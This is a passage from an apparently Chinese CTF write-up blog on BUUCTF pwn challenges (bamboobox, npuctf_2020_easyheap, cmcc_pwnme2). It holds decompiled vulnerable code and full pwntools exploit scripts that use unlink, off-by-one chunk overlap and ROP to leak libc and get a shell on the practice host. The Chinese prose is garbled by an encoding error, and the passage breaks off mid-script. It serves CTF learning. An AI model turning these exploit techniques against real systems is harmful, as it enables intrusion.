class="line">alloc(malloc_size,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">exit()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-unlink"><a href="#2-unlink" class="headerlink" title="2.unlink"></a>2.unlink</h2><p>ç›´æ¥çœ‹expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./bamboobox&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25477</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-x64-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">length,context</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the name of item:&quot;</span>)</span><br><span class="line">    r.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,length,context</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the length of item name:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the new name of the item:&quot;</span>)</span><br><span class="line">    r.send(context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Please enter the index of item:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span>():</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x80</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">glo=<span class="number">0x6020c8</span>+<span class="number">0x10</span><span class="comment">#</span></span><br><span class="line">fd=glo-<span class="number">0x18</span></span><br><span class="line">bk=glo-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(fd)+p64(bk)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"><span class="comment">#è¿™é‡Œp64(0x30)+p64(0x90)ï¼Œæ‰€ä»¥åé¢freeçš„æ—¶å€™ä¼šåˆå¹¶</span></span><br><span class="line"><span class="comment">#ä¹‹åchunk1å°±æ˜¯ä¼ªé€ çš„é‚£ä¸ªchunkäº†</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload1=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line">show()</span><br><span class="line">free_addr=u64(r.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) </span><br><span class="line">libc_base=free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#å°†freeæ”¹ä¸ºsystem</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x45-npuctf-2020-easyheap"><a href="#0x45-npuctf-2020-easyheap" class="headerlink" title="0x45.npuctf_2020_easyheap"></a>0x45.npuctf_2020_easyheap</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(&amp;heaparray)[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      (&amp;heaparray)[i] = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;heaparray)[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap(0x10 or 0x20 only) : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( size != <span class="number">0x18</span> &amp;&amp; size != <span class="number">0x38</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      v0 = (&amp;heaparray)[i];</span><br><span class="line">      v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !(&amp;heaparray)[i][<span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      *(&amp;heaparray)[i] = size;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">      read_input((&amp;heaparray)[i][<span class="number">1</span>], size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>editæœ‰off by one </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;heaparray)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    read_input((&amp;heaparray)[v1][<span class="number">1</span>], *(&amp;heaparray)[v1] + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How Dare you!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>deleteæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (&amp;heaparray)[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((&amp;heaparray)[v1][<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>((&amp;heaparray)[v1]);</span><br><span class="line">    (&amp;heaparray)[v1] = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How Dare you!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹å‰æœ‰ç±»ä¼¼çš„ï¼Œchunk overlappingã€‚</p><p>å› ä¸ºè¾“å…¥èœå•åæ‰§è¡Œçš„æ˜¯atoiæ‰€ä»¥å°†atoiæ”¹ä¸ºäº†system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./npuctf_2020_easyheap&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28803</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./npuctf_2020_easyheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-x64-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;only) : &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Content:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">io.send(<span class="built_in">str</span>(index))</span><br><span class="line">io.sendafter(<span class="string">&#x27;Content:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;bbbbbbb&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x41&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">8</span>)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">create(<span class="number">0x38</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line"><span class="comment"># a = u64(io.recvuntil(&quot;\x7f&quot;).ljust(8, &#x27;\x00&#x27;))</span></span><br><span class="line">print_addr =  u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">base = print_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = base+ libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(system_addr))</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x46-cmcc-pwnme2"><a href="#0x46-cmcc-pwnme2" class="headerlink" title="0x46.cmcc_pwnme2"></a>0x46.cmcc_pwnme2</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ checksec pwnme2</span><br><span class="line">[*] &#x27;/home/gwt/Desktop/pwnme2&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯mainå’Œuserfunctionï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">string</span> = <span class="number">0</span>;</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  userfunction(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">userfunction</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">108</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­sä¸º0x84ï¼Œè€Œdescåªæœ‰0x6cå¯ä»¥è¦†ç›–ï¼Œå¹¶ä¸”ä¼šå°†srcçš„åœ°å€æ‰“å°å‡ºæ¥</p><p>é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸‰ä¸ªå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">add_flag</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xCAFEBABE</span> &amp;&amp; a2 == <span class="number">0xABADF00D</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="built_in">strlen</span>(&amp;<span class="built_in">string</span>) + <span class="number">0x804A060</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(result, <span class="string">&quot;/.flag1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">add_home</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="built_in">strlen</span>(&amp;<span class="built_in">string</span>) + <span class="number">0x804A060</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(result, <span class="string">&quot;/home&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exec_string</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Bh] [ebp-Dh] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(&amp;<span class="built_in">string</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    perror(<span class="string">&quot;Wrong file&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">50</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€ä¹ˆè¯´å‘¢ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¿™å‡ ä¸ªå‡½æ•°å°±å¤Ÿäº†ï¼Œpayloadè¿™æ ·æ„é€ ï¼š</p><p><code>payload = &#39;a&#39;*(0x6c+4)+p32(add_home)+p32(pop)+p32(0xdeadbeef)+p32(add_flag)+p32(pop_pop)+p32(0xCAFEBABE)+p32(0xABADF00D)+p32(exec_string)</code></p><p>ä½†æ˜¯buuçš„å¹³å°éƒ½æ‡‚çš„ï¼Œflagåªåœ¨æ ¹ç›®å½•ä¸‹ï¼Œsoï¼š</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 